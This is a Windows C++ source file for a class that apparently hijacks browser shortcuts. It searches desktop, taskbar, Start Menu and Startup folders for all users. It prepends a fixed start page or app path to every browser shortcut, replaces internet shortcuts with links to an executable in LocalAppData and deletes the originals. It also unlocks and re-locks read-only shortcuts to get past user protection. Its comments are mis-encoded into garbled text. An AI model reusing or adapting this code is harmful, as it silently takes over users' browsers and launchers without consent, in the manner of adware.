#include "includes.h"
#include "LinksPlaying.h"

#include <tchar.h>
#include <string>
#include <windows.h>
#include <Shlobj.h>
#include <wchar.h>
#include <SYS\Stat.h>

#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")
#include <shobjidl.h>
#include <shlguid.h>
#include <strsafe.h>

#include "Debug.h"
#include <intshcut.h>



CLinksPlaying::CLinksPlaying(void):
	m_vecBrowserNameList(NULL),
	m_vecNeededLinksPath(NULL),
	m_vecTypeUrlNameList(NULL),
	m_sAppPath(std::wstring())
{
	Init();
}


CLinksPlaying::~CLinksPlaying(void)
{
}




BOOL CLinksPlaying::LockLink(const wchar_t* Path)
{
	return SetFileAttributes(Path, FILE_ATTRIBUTE_READONLY);
}


BOOL CLinksPlaying::UnLockLink(const wchar_t* Path)
{
	return SetFileAttributes(Path, FILE_ATTRIBUTE_NORMAL);
}


void CLinksPlaying::Init(void)
{
#ifdef DEBUG
// 	m_vecTypeUrlNameList.push_back(L"ok.exe");
// 	m_vecTypeUrlNameList.push_back(L"vk.exe");
#endif // DEBUG

 	m_vecTypeUrlNameList.push_back(L"http:");	//Opera WK
	m_vecTypeUrlNameList.push_back(L"https:");	//Chrome, chromium...




	Logger::_debug(L"m_vecTypeUrlNameList.size() = %d", m_vecTypeUrlNameList.size());

}

BOOL  CLinksPlaying::IsDots(const TCHAR* str) {
	if(_tcscmp(str,L".") && _tcscmp(str,L"..")) return FALSE;
	return TRUE;
}

BOOL CLinksPlaying::EnumerateFolder(std::wstring PathToFolder)
{
	if (!PathFileExists(PathToFolder.c_str())) return FALSE;

#ifdef DEBUG
	//MessageBox(0,PathToFolder.c_str(), L"DEBUG_INFO", NULL);
#endif


	BOOL bResult = FALSE;
	HANDLE hFind;  // file handle
	WIN32_FIND_DATA FindFileData;

	TCHAR DirPath[MAX_PATH];
	TCHAR FileName[MAX_PATH];

	_tcscpy_s(DirPath,PathToFolder.c_str());
	_tcscat_s(DirPath,L"\\*");    // searching all files
	_tcscpy_s(FileName,PathToFolder.c_str());
	_tcscat_s(FileName,L"\\");

	hFind = FindFirstFile(DirPath,&FindFileData); // find the first file
	if(hFind == INVALID_HANDLE_VALUE) return FALSE;
	_tcscpy_s(DirPath,FileName);

	bool bSearch = true;
	while(bSearch) { // until we finds an entry
		if(FindNextFile(hFind,&FindFileData)) {
			if(IsDots(FindFileData.cFileName)) continue;			 
			std::wstring sTemp= std::wstring(DirPath)+std::wstring(FindFileData.cFileName);
			if(sTemp.find(L".lnk")!=-1)
			{				
				m_vecAllUsersLinks.push_back(sTemp);
				bResult = TRUE;
				continue;		
			}
			if (sTemp.find(L".url") != -1)
			{
				m_vecAllUsersURLlinks.push_back(sTemp);
				bResult = TRUE;
				continue;
			}
			
		}
		else {
			if(GetLastError() == ERROR_NO_MORE_FILES) // no more files there
				bSearch = false;
			else {
				// some error occured, close the handle and return FALSE
				FindClose(hFind); 
				return bResult;
			}
		}
	}
	FindClose(hFind);  // closing file handle
return bResult;
}


void CLinksPlaying::run(void)
{
	if (S_OK == FillAllLinksPathes())
	{
		FillURLlinks();
		FillingNeededLinks();
	}

}


HRESULT CLinksPlaying::FillAllLinksPathes(void)
{
	//Appdata\\Roaming\\Microsoft\\Windows\\Start Menu
	///Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accesories
	//Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs
	//...oaming\Microsoft\Windows\Start Menu\Programs\Google Chrome
	//Users\\Public...
	//CSIDL_COMMON_DESKTOPDIRECTORY
	//CSIDL_COMMON_APPDATA
	//CSIDL_COMMON_ALTSTARTUP
	//CSIDL_COMMON_PROGRAMS C:\Documents and Settings\All Users\Start Menu\Programs.
	//CSIDL_COMMON_STARTMENU C:\Documents and Settings\All Users\Start Menu.
	//CSIDL_COMMON_STARTUP C:\Documents and Settings\All Users\Start Menu\Programs\Startup
	//CSIDL_DESKTOP ?
	//CSIDL_DESKTOPDIRECTORY C:\Documents and Settings\username\Desktop
	//CSIDL_PROFILE //...username...
	//CSIDL_STARTMENU //C:\Documents and Settings\username\Start Menu
	//CSIDL_STARTUP //C:\Documents and Settings\username\Start Menu\Programs\Startup
	BOOL bRes = FALSE;
	TCHAR path[MAX_PATH]; 
	Logger::_debug(L"FillAllLinksPathes");
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_DESKTOP, FALSE);
	bRes = EnumerateFolder(path); //Desktop
	Logger::_debug(L"EnumerateFolder(%s) = %d",path, bRes);
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_DESKTOPDIRECTORY, FALSE);
	bRes = EnumerateFolder(path); //Desktop
	Logger::_debug(L"EnumerateFolder(%s) = %d", path, bRes);
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_APPDATA, FALSE);
	std::wstring sTemp = path;
	
	sTemp.append(L"\\Microsoft\\Internet Explorer\\Quick Launch");
	bRes = EnumerateFolder(sTemp);//QuickLaunch
	Logger::_debug(L"EnumerateFolder(%s) = %d", sTemp.c_str(), bRes);
	sTemp.clear();
	sTemp = path;
	sTemp.append(L"\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar");
	bRes = EnumerateFolder(sTemp);//TaskBar
	//C:\Users\xman\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu
	Logger::_debug(L"EnumerateFolder(%s) = %d", sTemp.c_str(), bRes);
	sTemp.clear();
	sTemp = path;
	sTemp.append(L"\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\StartMenu");
	bRes = EnumerateFolder(sTemp);//User Pinned\\StartMenu
	Logger::_debug(L"EnumerateFolder(%s) = %d", sTemp.c_str(), bRes);
	sTemp.clear();
	sTemp = path;
	sTemp.append(L"\\Microsoft\\Windows\\Start Menu");
	bRes = EnumerateFolder(sTemp);//Start Menu
	sTemp.append(L"\\Programs");
	bRes = EnumerateFolder(sTemp);//Programs	
	Logger::_debug(L"EnumerateFolder(%s) = %d", sTemp.c_str(), bRes);
/*	sTemp.append(L"\\Google Chrome");
	bRes = EnumerateFolder(sTemp);//Programs//Google Chrome	
	Logger::_debug(L"EnumerateFolder(%s) = %d", sTemp.c_str(), bRes);*/

// 	bRes = EnumerateFolder(std::wstring(sTemp + std::wstring(L"\\Yandex")));//Programs	
// 	sTemp.append(L"\\Accesories");
// 	bRes = EnumerateFolder(sTemp);//Accesories

	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_STARTMENU, FALSE); //C:\Users\...\AppData\Roaming\Microsoft\Windows\Start Menu
	bRes = EnumerateFolder(path);//Start Menu

	Logger::_debug(L"EnumerateFolder(%s) = %d", path, bRes);

	bRes = EnumerateFolder(std::wstring(path + std::wstring(L"\\Programs"))); //Desktop
	Logger::_debug(L"EnumerateFolder(%s) = %d", std::wstring(path + std::wstring(L"\\Programs")).c_str(), bRes);
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_STARTUP, FALSE); //C:\Users\...\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
	bRes = EnumerateFolder(path);
	Logger::_debug(L"EnumerateFolder(%s) = %d", path, bRes);
	
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_PROFILE, FALSE); //C:\Users\Anton
	
	bRes = EnumerateFolder(path);
	Logger::_debug(L"EnumerateFolder(%s) = %d", path, bRes);
	

	


	//COMMON dirs
	//CSIDL_COMMON_DESKTOPDIRECTORY
	//CSIDL_COMMON_APPDATA
	//CSIDL_COMMON_ALTSTARTUP
	//CSIDL_COMMON_PROGRAMS C:\Documents and Settings\All Users\Start Menu\Programs.
	//CSIDL_COMMON_STARTMENU C:\Documents and Settings\All Users\Start Menu.
	//CSIDL_COMMON_STARTUP C:\Documents and Settings\All Users\Start Menu\Programs\Startup
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_COMMON_DESKTOPDIRECTORY, FALSE);
	bRes = EnumerateFolder(path); //Desktop
	Logger::_debug(L"EnumerateFolder(%s) = %d", path, bRes);
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_COMMON_APPDATA, FALSE);//--
	bRes = EnumerateFolder(path); //Desktop
	Logger::_debug(L"EnumerateFolder(%s) = %d", path, bRes);
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_COMMON_ALTSTARTUP, FALSE);//C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
	bRes = EnumerateFolder(path); //Desktop
	Logger::_debug(L"EnumerateFolder(%s) = %d", path, bRes);
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_COMMON_PROGRAMS, FALSE); //C:\ProgramData\Microsoft\Windows\Start Menu\Programs
	bRes = EnumerateFolder(path); //Desktop
	Logger::_debug(L"EnumerateFolder(%s) = %d", path, bRes);
	bRes = EnumerateFolder(std::wstring(path + std::wstring(L"\\Google Chrome"))); //Desktop
	Logger::_debug(L"EnumerateFolder(%s) = %d", path, bRes);
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_COMMON_STARTMENU, FALSE); //C:\ProgramData\Microsoft\Windows\Start Menu
	bRes = EnumerateFolder(path); //Desktop
	Logger::_debug(L"EnumerateFolder(%s) = %d", path, bRes);
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_COMMON_STARTUP, FALSE); //C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
	bRes = EnumerateFolder(path); //Desktop
	Logger::_debug(L"EnumerateFolder(%s) = %d", path, bRes);

	if (m_vecAllUsersLinks.size()>0 || m_vecAllUsersURLlinks.size()>0)
	{
		return S_OK;
	}
	return S_FALSE;
}



HRESULT CLinksPlaying::CreateLink(const wchar_t* lpszPathToObj, const wchar_t* lpszArguments, const wchar_t* lpszLinkFileName, const wchar_t* lpszDesc, const wchar_t* lpszIconLocation)
{
	HRESULT hres;
	IShellLink *psl;


	CoInitialize(NULL);

	// ѕолучить указатель на интерфейс IShellLink
	// (NULL);
	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID *)&psl);
	if (SUCCEEDED(hres))
	{
		IPersistFile *ppf;

		// ”становить путь к €рлыку и добавить описание
		psl->SetPath(lpszPathToObj);
		psl->SetArguments(lpszArguments);
		psl->SetDescription(lpszDesc);
		psl->SetIconLocation(lpszIconLocation, 0);

		// ѕреобразовать IShellLink в IPersistFile дл€ сохранени€ €рлыка
		hres = psl->QueryInterface(IID_IPersistFile, (LPVOID *)&ppf);

		if (SUCCEEDED(hres))
		{
			// —охранить €рлык вызовом IPersistFile::Save.
			hres = ppf->Save(lpszLinkFileName, FALSE);
			ppf->Release();
		}
		psl->Release();
	}

	CoUninitialize();
	return hres;
}


HRESULT CLinksPlaying::FillURLlinks(void)
{
	HRESULT hres;
	IShellLink* psl = NULL;
	WCHAR szGotPath[MAX_PATH];
	//WCHAR szDescription[MAX_PATH]; 
	WIN32_FIND_DATA wfd;


	if (m_vecAllUsersURLlinks.size() <= 0) return S_FALSE;

	CoInitialize(NULL);
	// Get a pointer to the IShellLink interface. It is assumed that CoInitialize
	// has already been called. 
	IUniformResourceLocator *pURL = NULL;
	hres = CoCreateInstance(CLSID_InternetShortcut, NULL,
		CLSCTX_INPROC_SERVER, IID_IUniformResourceLocator, (LPVOID*)&pURL);
	if (SUCCEEDED(hres))
	{
		IPersistFile* ppf;
		

		

		// Get a pointer to the IPersistFile interface. 
		
		hres = pURL->QueryInterface(IID_IPersistFile, (void**)&ppf);

		if (SUCCEEDED(hres))
		{

			for (std::vector<std::wstring>::iterator it = m_vecAllUsersURLlinks.begin(); it != m_vecAllUsersURLlinks.end(); it++)
			{
				// Load the shortcut. 				
				hres = ppf->Load((it)->c_str(), STGM_READWRITE);

				//hres = ppf->GetCurFile((it)->c_str());			
// 
// 				hres = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
				if (SUCCEEDED(hres))
				{
					// Resolve the link. check for object(*.exe)
					//	hres = psl->Resolve(0, SLR_NO_UI | SLR_NO_UI_WITH_MSG_PUMP);
					LPWSTR lpTemp;
					hres = pURL->GetURL(&lpTemp);
					std::wstring sUrlPath = lpTemp;
					//GetFileName
					
					std::wstring sTmp = it->c_str();
					sTmp = sTmp.erase(sTmp.find(L".url"));
					sTmp.append(L".lnk");


					GetAppName();

					//Create Link
					CreateLink(GetAppName().c_str(), sUrlPath.c_str(), sTmp.c_str(), L"Internet", GetAppName().c_str());

					//Erase old link	
					DeleteFile(it->c_str());
				}
			}

			ChangeAttributes(NULL, false);
			ppf->Release();
		}
		pURL->Release();
	}
	return hres;

	//if (m_mapBrowsersLinkPathes.size()>0) return S_OK;

	CoUninitialize();
	return S_FALSE;
}
HRESULT CLinksPlaying::FillingNeededLinks(void)
{
	HRESULT hres; 
	IShellLink* psl; 
	WCHAR szGotPath[MAX_PATH]; 
	//WCHAR szDescription[MAX_PATH]; 
	WIN32_FIND_DATA wfd; 
	

	if (m_vecAllUsersLinks.size() <= 0) return S_FALSE;

	CoInitialize(NULL);
	// Get a pointer to the IShellLink interface. It is assumed that CoInitialize
	// has already been called. 
	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl); 
	if (SUCCEEDED(hres)) 
	{ 
		IPersistFile* ppf; 
		IUniformResourceLocator *pURL = NULL;

		hres = CoCreateInstance(CLSID_InternetShortcut, NULL,
			CLSCTX_INPROC_SERVER, IID_IUniformResourceLocator, (LPVOID*)&pURL);

		// Get a pointer to the IPersistFile interface. 
		//hres = psl->QueryInterface(IID_IPersistFile, (void**)&ppf); 
		hres = pURL->QueryInterface(IID_IPersistFile, (void**)&ppf);

		if (SUCCEEDED(hres)) 
		{ 
			
			for (std::vector<std::wstring>::iterator it = m_vecAllUsersLinks.begin(); it != m_vecAllUsersLinks.end(); it++)
			{				
				// Load the shortcut. 				
				hres = ppf->Load((it)->c_str(), STGM_READWRITE);
			
				//hres = ppf->GetCurFile((it)->c_str());
				LPWSTR lpTemp;
				pURL->GetURL(&lpTemp);

				hres = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
				if (SUCCEEDED(hres))
				{ 
					// Resolve the link. check for object(*.exe)
				//	hres = psl->Resolve(0, SLR_NO_UI | SLR_NO_UI_WITH_MSG_PUMP);

					if(hres == S_OK)
					{ 
						
						hres = psl->GetPath(szGotPath, MAX_PATH, (WIN32_FIND_DATA*)&wfd, SLGP_SHORTPATH); 
						hres = psl->GetPath(szGotPath, MAX_PATH, (WIN32_FIND_DATA*)&wfd, SLGP_RAWPATH);
						hres = psl->GetArguments(szGotPath, MAX_PATH);
						hres = psl->GetDescription(szGotPath, MAX_PATH);
						if (!SUCCEEDED(hres)) continue;
						std::wstring lpszPath = szGotPath;

						for (std::vector<std::wstring>::iterator it2 = m_vecTypeUrlNameList.begin(); it2 != m_vecTypeUrlNameList.end(); it2++)
						{
							if (lpszPath.find(it2->c_str()) != -1)
							{
								ChangeAttributes(it->c_str());

								hres = psl->GetArguments(szGotPath, MAX_PATH);
								if (!SUCCEEDED(hres)) continue;

									std::wstring sTempArg;
									if (m_sAppPath.size()>0)
									{
										sTempArg.append(m_sAppPath);
									}else sTempArg.append(DEF_START_PAGE);
					
									sTempArg.append(L" ");
									sTempArg.append(szGotPath);
									psl->SetArguments(sTempArg.c_str());
									
#ifdef DEBUG
									hres = psl->GetArguments(szGotPath,MAX_PATH); //DEBUG
									Logger::_debug(L"psl->GetArguments(szGotPath,MAX_PATH) = %s", szGotPath);
									hres = psl->GetPath(szGotPath, MAX_PATH, (WIN32_FIND_DATA*)&wfd, SLGP_SHORTPATH); 
									Logger::_debug(L"psl->GetPath = %s", szGotPath);
									Sleep(200);
#endif // DEBUG
//								}

								hres = psl->Resolve(0, 0);

								if (SUCCEEDED(hres)) 
								{    
									hres = ppf->Save((it)->c_str(), TRUE); 
									//ppf->Release(); 
									break;
								} 
							}
						}									
					} 
#ifdef DEBUG
					else
					{
						hres = psl->GetPath(szGotPath, MAX_PATH, (WIN32_FIND_DATA*)&wfd, SLGP_SHORTPATH);
					}
#endif // DEBUG
				} 

				
			}	

			ChangeAttributes(NULL, false);
			ppf->Release(); 
		} 		
		psl->Release(); 
	} 
	return hres; 

	//if (m_mapBrowsersLinkPathes.size()>0) return S_OK;

	CoUninitialize();
	return S_FALSE;
}


std::wstring CLinksPlaying::GetAppName()
{

	BOOL bRes = FALSE;
	TCHAR path[MAX_PATH];
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_LOCAL_APPDATA, FALSE);
	std::wstring sTemp = path;

	m_sAppPath.clear();
	m_sAppPath.append(sTemp);
	m_sAppPath.append(DEF_APP_PATH);
	

	Logger::_debug(L"GetAppName (%s)", m_sAppPath.c_str());

	return m_sAppPath;
}


BOOL CLinksPlaying::GetLokedInfo(const wchar_t * Path)
{
	DWORD dFileAttr = 0;
	dFileAttr = GetFileAttributes(Path);

	if (dFileAttr==INVALID_FILE_ATTRIBUTES) return FALSE;

	if (dFileAttr & FILE_ATTRIBUTE_READONLY)
	{
		m_vecLinkLockedList.push_back(Path);
		return TRUE;
	}
	else
	{
		return FALSE;
	}
// 	switch (dFileAttr)
// 	{
// 	case FILE_ATTRIBUTE_READONLY:
// 		{
// 			m_vecLinkLockedList.push_back(Path);
// 			return TRUE;
// 			break;
// 		}
// 	case INVALID_FILE_ATTRIBUTES:
// 		{
// 			return FALSE;
// 		}
// 		break;
// 	
// 	default:
//		break;
// 	}
	return FALSE;
}


BOOL CLinksPlaying::ChangeAttributes(const wchar_t * Path, bool bUnlock)
{
	BOOL bRes = FALSE;
	if (bUnlock)
	{	
		if (GetLokedInfo(Path) )
		{
			bRes =  UnLockLink(Path);
		}
	}
	else
	{
		if (m_vecLinkLockedList.size() > 0)
		{
			for (std::vector<std::wstring>::iterator it = m_vecLinkLockedList.begin(); it != m_vecLinkLockedList.end(); it++)
			{
				bRes = LockLink(it->c_str());
			}
		}
	}



	return bRes;
}
